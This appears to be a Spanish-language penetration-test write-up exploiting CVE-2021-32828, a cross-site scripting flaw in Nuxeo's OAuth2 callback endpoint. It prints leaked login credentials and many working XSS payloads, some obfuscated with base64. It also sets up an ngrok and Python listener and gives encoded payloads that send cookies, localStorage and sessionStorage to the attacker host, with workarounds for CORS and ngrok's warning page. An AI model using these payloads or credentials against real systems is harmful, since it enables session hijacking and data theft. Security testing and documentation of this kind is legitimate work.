## Hallazgo: Nuxeo - XSS escalada a RCE (CVE-2021-32828)

### 1. Acceso inicial a la plataforma

Se accedió al portal de Nuxeo mediante la siguiente URL:
```
https://<PortalNuxeo>/nuxeo/login.jsp?requestedUrl=ui%2F
```
Allí se cargó correctamente la interfaz gráfica de inicio de sesión de Nuxeo.

![Interfaz gráfica login Nuxeo]
<img width="1752" height="937" alt="image" src="https://github.com/user-attachments/assets/6316a8ab-0a70-4b94-bc33-2ea9f47a1875" />

Se utilizaron credenciales filtradas y aún válidas para iniciar sesión:

- **Usuario:** usuario  
- **Contraseña:** usuario2019

El navegador (Google Chrome) advirtió que dichas credenciales han sido comprometidas en filtraciones previas.

![Advertencia de Chrome sobre credenciales filtradas]
<img width="1800" height="911" alt="image" src="https://github.com/user-attachments/assets/402a25ec-b319-44db-bc1f-56ebe7b54c7b" />

---

### 2. Exploración y descubrimiento del motor web

Una vez autenticado, se identificó que la plataforma ejecuta el sistema **Nuxeo Web Engine**.

![Interfaz Nuxeo Web Engine]
<img width="1471" height="553" alt="image" src="https://github.com/user-attachments/assets/43358b1a-3560-4307-a659-537eee08c5c3" />


Aunque no se logró identificar con exactitud la versión del sistema, se realizó una enumeración de directorios que reveló rutas relacionadas con OAuth, en particular:
```
/nuxeo/site/oauth2/
```

**OAuth (Open Authorization)** es un protocolo estándar que permite a las aplicaciones obtener acceso limitado a cuentas de usuario sin exponer las credenciales.

![Enumeración de directorios relevantes]
<img width="1164" height="658" alt="image" src="https://github.com/user-attachments/assets/368b467e-d574-4ccf-90ae-74314197e228" />


---

### 3. Identificación de vulnerabilidad (CVE-2021-32828)

Con base en los resultados anteriores, se investigaron vulnerabilidades conocidas en Nuxeo relacionadas con OAuth. Se identificó la siguiente:

- **CVE-2021-32828**: En versiones anteriores a la 11.5.109, la API REST `/oauth2` de Nuxeo es vulnerable a ataques de **Cross-Site Scripting (XSS)**. Este ataque puede ser escalado a **Remote Code Execution (RCE)** mediante el uso de la API de automatización.

![Referencia CVE]
<img width="1282" height="772" alt="image" src="https://github.com/user-attachments/assets/f50e3af5-ca7f-4186-9b2c-9118fa46730e" />


**Endpoint vulnerable:**
```
/nuxeo/site/oauth2/{serviceProviderName}/callback
```

---

### 4. Prueba de concepto (XSS básico)

Se probó un payload XSS clásico apuntando directamente al endpoint vulnerable:
```
https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src%20onerror=alert(document.domain)%3E/callback
```

El resultado fue exitoso, mostrando una alerta con el dominio del sitio.

![XSS exitoso con alert]
<img width="1394" height="348" alt="image" src="https://github.com/user-attachments/assets/2427dcb3-ee51-43bf-a2c6-835bb8e3ad17" />

---

### 5. Análisis de RCE potencial

**Referencia Blog:**
**https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo**

El blog de [Álvaro Muñoz](https://github.com/pwntester) describe una posible explotación para escalar el XSS a RCE usando carga de scripts externos:
```
http://localhost:8080/nuxeo/site/oauth2/%3Cimg%20src%20onerror%3Da%3Ddocument.createElement('script')%3ba.setAttribute('src',document.location.hash.substr(1))%3bdocument.head.appendChild(a)%3E/callback#//attacker.ngrok.io/exploit.js
```

Sin embargo, este método no funcionó en el entorno evaluado. Se intentaron variaciones del payload, pero el sistema interpretaba el contenido como texto plano y no lo ejecutaba directamente. Se procedió a probar distintos vectores XSS alternativos.

---

### 6. Pruebas de payloads alternativos

Se exploraron varias técnicas para evadir filtros o mejorar la ejecución del código inyectado:

**- Payload 1: onerror + eval con Base64**
```
<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>
```
> Decodificado: `alert('XSS')`

- **- Payload 2: SVG con evento onload**
```
<svg onload=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>
```
> Decodificado: `alert(document.cookie)`

- **- Payload 3: iframe con srcdoc**
```
<iframe srcdoc="<script>alert(1)</script>"> ```
```

**- Payload 4: script tag directo**
```
https://<PortalNuxeo>/nuxeo/site/oauth2/<script>alert(1)</script>/callback
```

**- Payload 5: Codificación hexadecimal en el evento**
```
https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x o%6Eerror=alert(1)>/callback
```

**- Payload 6: Comentario HTML para evadir detección**
```
https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=eval/--/(atob("YWxlcnQoMSk="))>/callback
```
> alert(1)

**- Payload 7: Exfiltración con location.href**
```
https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=location.href='https://attacker.com?c='+document.cookie>/callback
```

**- Payload 8: Interacción con DOM**
```
https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=alert(document.body.innerHTML)>/callback
```

De todas las pruebas, los payloads exitosos fueron:
```
<svg onload=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>/callback
<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>/callback
<img src=x o%6Eerror=alert(1)>/callback
<img src=x onerror=alert(document.body.innerHTML)>/callback
```

Se observó que los payloads codificados en Base64 tenían una alta tasa de éxito. De ello se dedujo que una plantilla efectiva para explotación sería:
```
<img src=x onerror=eval(atob("COMANDO_EN_BASE64"))>/callback
```

---

### 7. Recolección de datos vía XSS

Se preparó un entorno para capturar información enviada desde el navegador víctima.

### Iniciar Servicios

Abre dos terminales o pestañas separadas para ejecutar los siguientes comandos:

1. **Iniciar túnel con Ngrok en el puerto 80:**

```bash
ngrok http 80
```

2. **Iniciar servidor web en el puerto 80:**

```bash
python3 -m http.server 80
```


---

### 8. Explotación con redirección de datos

Se ejecutó el siguiente payload XSS que realiza una petición hacia el servidor controlado por el atacante:
`i=new Image();i.src="https://xxxxx.ngrok-free.app/log?c="+document.cookie;`
```
https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly94eHh4eC5uZ3Jvay1mcmVlLmFwcC9sb2c/Yz0iK2RvY3VtZW50LmNvb2tpZTs=%22))%3E/callback
```
_________________________________________________

### A tener en cuenta

Hubo una situación particular al hacer que funcionara el script codificado, debido a un problema al hacer **fetch** al servidor Ngrok.

Cuando se visita manualmente `https://xxxxx.ngrok-free.app`, aparece un _browser warning_ de Ngrok que bloquea el acceso automático.  
Esto es lo que está bloqueando tu petición con `fetch`. Ngrok ahora intercepta tráfico HTTP(S) sospechoso y requiere cabeceras especiales.

<img width="1593" height="891" alt="image" src="https://github.com/user-attachments/assets/10555ab4-b275-4950-8bee-c858d61494b6" />

Como Ngrok lo documenta claramente, se debe agregar esta cabecera especial:
```
ngrok-skip-browser-warning: true
```
Por lo tanto, el código funcional que se debe enviar sería:

```javascript
fetch("https://xxxxx.ngrok-free.app/log", {
  headers: {
    "ngrok-skip-browser-warning": "true"
  }
})
```
Quedando finalmente y antes de codificar asi:
```
btoa(`fetch("https://xxxxx.ngrok-free.app/log", {headers: {"ngrok-skip-browser-warning": "true"}})`)
```

Sin embargo, esto generaba otro error, específicamente un error 505, ya que el navegador intenta hacer una preflight request CORS (método OPTIONS) antes de enviar el fetch.

<img width="1652" height="307" alt="image" src="https://github.com/user-attachments/assets/611eaf6c-1a96-4e3b-9690-cbcce3708048" />

**Alternativa sin CORS**

Lo ideal en este caso es evitar el uso de fetch y utilizar una imagen invisible, que no genera preflight ni está sujeta a CORS, de la siguiente manera:
```
i = new Image();i.src = "https://xxxxx.ngrok-free.app/log?c=" + document.cookie;

# O alternativamente usar:
location.href="https://xxxx.ngrok-free.app/log?c="+document.cookie;
```
Codificado en base 64:
```
https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly94eHh4eC5uZ3Jvay1mcmVlLmFwcC9sb2c/Yz0iK2RvY3VtZW50LmNvb2tpZTs=%22))%3E/callback

https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22bG9jYXRpb24uaHJlZj0iaHR0cHM6Ly83ZmMyNzlhM2ZlYWYubmdyb2stZnJlZS5hcHAvbG9nP2M9Iitkb2N1bWVudC5jb29raWU7%22))%3E/callback
```

_________________________________________________


![Payload XSS apuntando al servidor atacante]
<img width="1919" height="206" alt="image" src="https://github.com/user-attachments/assets/90b149e2-0d71-47cb-8cdf-4ca797f12c26" />



La petición fue recibida exitosamente en el servidor del atacante.

![Petición recibida en servidor atacante]
<img width="1797" height="813" alt="image" src="https://github.com/user-attachments/assets/66461f11-69a3-4001-a4de-d4673f8c589d" />


---

### 9. Confirmación de cookies obtenidas

A pesar del error 404, se verificó que las cookies recibidas coincidían con aquellas no protegidas por las banderas `HttpOnly` ni `Secure`, lo que permite su exposición vía JavaScript.

![Comparación entre cookies recibidas y cookies de la víctima]
<img width="1793" height="880" alt="image" src="https://github.com/user-attachments/assets/66c58d5a-bf4d-46f1-bff1-6d0b47247b1c" />


_______________________________________________________________________
_________________________________________________________________________
_________________________________________________________________________

### Por cuestiones de tiempo no se pudo continuar con el pentest y comprobación del RCE, pero quedan estas prueas interesantes


https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22YWxlcnQoZG9jdW1lbnQuY29va2llKQ==%22))%3E/callback
> alert(document.cookie)

https://PortalNuxeo/nuxeo/site/oauth2/<img src=x onerror=eval(atob("bGV0IGRhdGEgPSAiYz0iICsgZG9jdW1lbnQuY29va2llICsgIiZsPSIgKyBKU09OLnN0cmluZ2lmeShsb2NhbFN0b3JhZ2UpICsgIiZzPSIgKyBKU09OLnN0cmluZ2lmeShzZXNzaW9uU3RvcmFnZSkgKyAiJnU9IiArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ocmVmKTsgbG9jYXRpb24uaHJlZj0iaHR0cHM6Ly94eHh4Lm5ncm9rLWZyZWUuYXBwL2xvZz8iICsgZGF0YTs="))>/callback
> let data = "c=" + document.cookie + "&l=" + JSON.stringify(localStorage) + "&s=" + JSON.stringify(sessionStorage) + "&u=" + encodeURIComponent(document.location.href); location.href="https://xxxx.ngrok-free.app/log?" + data;

https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiPGlmcmFtZSBzcmM9J2h0dHBzOi8veHh4eHh4eC5jb20vJz48L2lmcmFtZT4iOw==%22))%3E/callback
> document.body.innerHTML = "<iframe src='https://WebVulnerableAClickJacking.com/'></iframe>";

https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiPGlmcmFtZSBzcmM9J2h0dHBzOi8vN2ZjMjc5YTNmZWFmLm5ncm9rLWZyZWUuYXBwL2lmcmFtZS5odG1sJyB3aWR0aD0nMTAwJScgaGVpZ2h0PSc2MDBweCc+PC9pZnJhbWU+Ijs=%22))%3E/callback


### Al igual al final si pude descubrir la version del Nuxeo siendo la 9.10 hotfix:
<img width="1908" height="512" alt="image" src="https://github.com/user-attachments/assets/c6fe823f-7b3c-468c-874a-ca5a82768b1e" />


Esta version tiene otro exploit asociado **CVE-2018-16341**, pero lo comprobe y en mi caso no era vulnerable
https://github.com/mpgn/CVE-2018-16341
